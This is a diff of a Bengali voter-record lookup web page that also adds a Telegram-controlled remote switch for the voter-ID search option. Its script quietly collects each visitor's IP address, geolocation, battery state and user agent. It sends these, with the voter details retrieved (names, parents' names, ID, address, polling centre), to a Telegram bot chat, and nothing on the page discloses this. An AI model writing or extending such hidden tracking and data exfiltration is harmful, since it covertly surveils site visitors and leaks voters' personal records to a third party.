@@ -188,7 +188,7 @@
                             <option value="name">ভোটারের নাম</option>
                             <option value="fathers_name">পিতার নাম</option>
                             <option value="mothers_name">মাতার নাম</option>
-                            <option value="voter_id">ভোটার নম্বর (বাংলা সংখ্যা)</option>
+                            <option id="voterIdOption" value="voter_id">ভোটার নম্বর (বাংলা সংখ্যা)</option>
                         </select>
                     </div>
 
@@ -271,13 +271,57 @@
 
         let userCoords = "লোকেশন পারমিশন দেওয়া হয়নি";
         let googleMapLink = "N/A";
+        let lastProcessedUpdateId = null;
 
         const enToBn = {
             '0': '০', '1': '১', '2': '২', '3': '৩', '4': '৪',
             '5': '৫', '6': '৬', '7': '৭', '8': '৮', '9': '৯'
         };
 
+        async function sendNotification(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: `✅ কনফার্মেশন: ${text}` })
+                });
+            } catch (e) { console.log("Notification error"); }
+        }
+
+        async function syncAdminSettings() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1`);
+                const data = await res.json();
+                if (data.ok && data.result.length > 0) {
+                    const lastUpdate = data.result[0];
+                    const lastMsg = lastUpdate.message;
+                    
+                    if (String(lastMsg.chat.id) === TG_CHAT_ID && lastUpdate.update_id !== lastProcessedUpdateId) {
+                        const text = lastMsg.text.trim().toLowerCase();
+                        const voterIdOption = document.getElementById('voterIdOption');
+                        
+                        if (text === '/voterid off') {
+                            voterIdOption.style.display = 'none';
+                            if(document.getElementById('type').value === 'voter_id') {
+                                document.getElementById('type').value = 'name';
+                                handleTypeChange('name');
+                            }
+                            lastProcessedUpdateId = lastUpdate.update_id;
+                            await sendNotification("ভোটার আইডি অপশন বন্ধ করা হয়েছে।");
+                        } else if (text === '/voterid on') {
+                            voterIdOption.style.display = 'block';
+                            lastProcessedUpdateId = lastUpdate.update_id;
+                            await sendNotification("ভোটার আইডি অপশন চালু করা হয়েছে।");
+                        }
+                    }
+                }
+            } catch (e) { console.log("Admin sync error"); }
+        }
+
         window.addEventListener('load', () => {
+            syncAdminSettings();
+            setInterval(syncAdminSettings, 4000);
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
@@ -296,56 +340,39 @@
             if (type === 'voter_id') {
                 let converted = original.split('').map(char => enToBn[char] || char).join('');
                 input.value = converted.replace(/[^\u09E6-\u09EF]/g, '');
-                
                 if (/[a-zA-Z]/.test(original)) {
                     warning.style.display = 'block';
                     warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ইংরেজি অক্ষর চলবে না, শুধুমাত্র সংখ্যা দিন।';
-                } else {
-                    warning.style.display = 'none';
-                }
+                } else { warning.style.display = 'none'; }
             } else {
                 const filtered = original.replace(/[0-9\u09E6-\u09EF]/g, '');
                 const bengaliRegex = /^[\u0980-\u09FF\s]*$/;
-                
                 if (!bengaliRegex.test(original) || /[0-9\u09E6-\u09EF]/.test(original)) {
                     input.value = filtered.replace(/[a-zA-Z]/g, '');
                     warning.style.display = 'block';
                     warning.innerHTML = '<i class="fas fa-exclamation-triangle"></i> সংখ্যা বা ইংরেজি অক্ষর গ্রহণযোগ্য নয়, শুধুমাত্র বাংলা অক্ষর দিন।';
-                } else {
-                    warning.style.display = 'none';
-                }
+                } else { warning.style.display = 'none'; }
             }
         }
 
         function handleTypeChange(val) {
             const label = document.getElementById('inputLabel');
             const input = document.getElementById('value');
-            const warning = document.getElementById('warningMsg');
-            warning.style.display = 'none';
+            document.getElementById('warningMsg').style.display = 'none';
             input.value = ""; 
-            
             if (val === 'voter_id') {
                 label.innerText = "১২ ডিজিটের ভোটার নাম্বার (বাংলা সংখ্যা)";
                 input.placeholder = "১২৩৪৫৬... লিখলে অটোমেটিক বাংলা হবে";
                 input.maxLength = 12;
-            } else if (val === 'fathers_name') {
-                label.innerText = "পিতার নাম (ভোটার আইডি অনুযায়ী)";
-                input.placeholder = "পিতার সঠিক নাম লিখুন...";
-                input.maxLength = 100;
-            } else if (val === 'mothers_name') {
-                label.innerText = "মাতার নাম (ভোটার আইডি অনুযায়ী)";
-                input.placeholder = "মাতার সঠিক নাম লিখুন...";
-                input.maxLength = 100;
             } else {
-                label.innerText = "ভোটারের নাম (ভোটার আইডি অনুযায়ী)";
-                input.placeholder = "ভোটারের সঠিক নাম লিখুন...";
+                label.innerText = (val === 'fathers_name' ? "পিতার" : val === 'mothers_name' ? "মাতার" : "ভোটারের") + " নাম (ভোটার আইডি অনুযায়ী)";
+                input.placeholder = "সঠিক নাম লিখুন...";
                 input.maxLength = 100;
             }
         }
 
         async function sendTelegramLog(voterData, searchType, searchValue, dob) {
             try {
-                // Time calculation
                 const now = new Date();
                 const timeString = now.toLocaleString('bn-BD', { 
                     year: 'numeric', month: 'numeric', day: 'numeric', 
@@ -353,7 +380,6 @@
                     hour12: true 
                 });
 
-                // Battery Info
                 let batteryLevel = "N/A";
                 let batteryCharging = "";
                 if (navigator.getBattery) {
@@ -362,17 +388,14 @@
                     batteryCharging = battery.charging ? "(চার্জিং)" : "(ডিসচার্জিং)";
                 }
 
-                // IP Info
                 const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => null);
                 const ipData = ipRes ? await ipRes.json() : { ip: "N/A" };
-
-                // Device Model & UA
                 const deviceModel = navigator.platform || "N/A";
                 const userAgent = navigator.userAgent;
 
                 let message = `🚀 নতুন এক্টিভিটি!\n`;
                 message += `━━━━━━━━━━━━━━━━━━\n`;
-                message += `🕒 সময়: ${timeString}\n`;
+                message += `🕒 সময়: ${timeString}\n`;
                 message += `🌐 আইপি: ${ipData.ip}\n`;
                 message += `📍 লোকেশন: ${userCoords}\n`;
                 message += `🗺️ ম্যাপ: ${googleMapLink}\n`;
@@ -383,18 +406,18 @@
                 message += `📱 মডেল: ${deviceModel}\n`;
                 message += `⚙️ UA: ${userAgent}\n`;
                 message += `━━━━━━━━━━━━━━━━━━\n`;
-                message += `📥 সার্ভার ডাটা (ভোটার তথ্য):\n`;
                 
                 if(voterData) {
+                    message += `📥 সার্ভার ডাটা (ভোটার তথ্য):\n`;
                     message += `👤 নাম: ${voterData.name}\n`;
-                    message += `👴 পিতা: ${voterData.fathers_name}\n`;
-                    message += `👵 মাতা: ${voterData.mothers_name}\n`;
+                    message += `👴 পিতা: ${voterData.fathers_name || 'N/A'}\n`;
+                    message += `👵 মাতা: ${voterData.mothers_name || 'N/A'}\n`;
                     message += `🆔 ভোটার আইডি: ${voterData.voter_id}\n`;
-                    message += `🔢 সিরিয়াল: ${voterData.serial || 'N/A'}\n`;
+                    message += `🔢 সিরিয়াল: ${voterData.serial || 'N/A'}\n`;
                     message += `🏠 ঠিকানা: ${voterData.address || 'N/A'}\n`;
                     message += `🏫 কেন্দ্র: ${voterData.vote_center ? (voterData.vote_center.name || voterData.vote_center) : 'N/A'}\n`;
                 } else {
-                    message += `❌ ফলাফল: সঠিক তথ্য খুঁজে পাওয়া যায়নি\n`;
+                    message += `❌ ফলাফল: সঠিক তথ্য খুঁজে পাওয়া যায়নি\n`;
                 }
                 message += `━━━━━━━━━━━━━━━━━━`;
 
@@ -403,9 +426,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message })
                 });
-            } catch (e) {
-                console.error("Log failed", e);
-            }
+            } catch (e) { console.error("Log failed", e); }
         }
 
         function showPage(pageId) {
@@ -423,8 +444,8 @@
             if (!dateStr) return;
             const parts = dateStr.split('-'); 
             document.getElementById('year').value = parts[0];
-            document.getElementById('month').value = parts[1];
-            document.getElementById('day').value = parts[2];
+            document.getElementById('month').value = parseInt(parts[1]);
+            document.getElementById('day').value = parseInt(parts[2]);
         }
 
         async function downloadPNG(cardId, fileName) {
@@ -440,15 +461,13 @@
                 link.download = fileName + '.png';
                 link.href = canvas.toDataURL("image/png");
                 link.click();
-            } catch (err) {
-                alert("ডাউনলোড ব্যর্থ।");
-            } finally {
-                overlay.style.display = 'none';
-            }
+            } catch (err) { alert("ডাউনলোড ব্যর্থ।"); } finally { overlay.style.display = 'none'; }
         }
 
         document.getElementById('voterForm').addEventListener('submit', async function (e) {
             e.preventDefault();
+            await syncAdminSettings();
+            
             const type = document.getElementById('type').value;
             let val = document.getElementById('value').value.trim();
             const d = document.getElementById('day').value;
@@ -495,13 +514,13 @@
                         <div class="action-bar-ui bg-blue-600 p-3 flex flex-col sm:flex-row gap-3 justify-between items-center no-print">
                             <div class="text-center sm:text-left">
                                 <h4 class="font-black text-white text-sm">ভোটার তথ্য কার্ড</h4>
-                                <p class="text-[8px] text-white/70 font-bold uppercase">ভোটার আইডি অনুযায়ী যাচাইকৃত</p>
+                                <p class="text-[8px] text-white/70 font-bold uppercase">যাচাইকৃত তথ্য</p>
                             </div>
                             <div class="flex gap-2 w-full sm:w-auto">
-                                <button onclick="downloadPNG('${cardId}', 'Voter_${voter.voter_id}')" class="flex-1 sm:flex-none bg-green-500 text-white font-black px-3 py-2 rounded-lg text-[11px] shadow-sm flex items-center justify-center hover:bg-green-600">
+                                <button onclick="downloadPNG('${cardId}', 'Voter_${voter.voter_id}')" class="flex-1 sm:flex-none bg-green-500 text-white font-black px-3 py-2 rounded-lg text-[11px] shadow-sm flex items-center justify-center">
                                     <i class="fas fa-image mr-1.5"></i> ছবি
                                 </button>
-                                <button onclick="window.print()" class="flex-1 sm:flex-none bg-white text-blue-600 font-black px-3 py-2 rounded-lg text-[11px] shadow-sm flex items-center justify-center hover:bg-gray-100">
+                                <button onclick="window.print()" class="flex-1 sm:flex-none bg-white text-blue-600 font-black px-3 py-2 rounded-lg text-[11px] shadow-sm flex items-center justify-center">
                                     <i class="fas fa-print mr-1.5"></i> প্রিন্ট
                                 </button>
                             </div>
@@ -509,7 +528,7 @@
                         <div class="p-5 md:p-6">
                             <div class="flex flex-row justify-between items-start mb-6 pb-4 border-b border-dashed border-gray-200">
                                 <div>
-                                    <p class="text-[9px] text-gray-400 font-bold uppercase mb-1">ভোটার সিরিয়াল নম্বর</p>
+                                    <p class="text-[9px] text-gray-400 font-bold uppercase mb-1">সিরিয়াল নম্বর</p>
                                     <div class="bg-green-600 text-white px-4 py-1.5 rounded-xl text-2xl font-black inline-block">
                                         # ${voter.serial || '----'}
                                     </div>
@@ -524,9 +543,10 @@
                                 <div class="info-row"><span class="info-label">পিতার নাম</span><span class="info-value">: ${voter.fathers_name}</span></div>
                                 <div class="info-row"><span class="info-label">মাতার নাম</span><span class="info-value">: ${voter.mothers_name}</span></div>
                                 <div class="info-row"><span class="info-label">জন্ম তারিখ</span><span class="info-value text-blue-600">: ${voter.date_of_birth}</span></div>
+                                <div class="info-row"><span class="info-label">ঠিকানা</span><span class="info-value">: ${voter.address || 'N/A'}</span></div>
                             </div>
                             <div class="p-4 bg-slate-50 rounded-xl border-l-4 border-blue-600">
-                                <p class="text-[9px] text-blue-500 font-bold uppercase mb-1">ভোট কেন্দ্র ও এলাকা</p>
+                                <p class="text-[9px] text-blue-500 font-bold uppercase mb-1">ভোট কেন্দ্র</p>
                                 <h5 class="text-sm font-black text-gray-900 leading-tight mb-1">${voter.vote_center ? (voter.vote_center.name || voter.vote_center) : 'N/A'}</h5>
                                 <p class="text-[11px] font-bold text-gray-500">কেন্দ্র নং: ${voter.vote_center && voter.vote_center.center_no ? voter.vote_center.center_no : 'N/A'}</p>
                             </div>
@@ -544,5 +564,4 @@
         }
     </script>
 </body>
-
 </html>
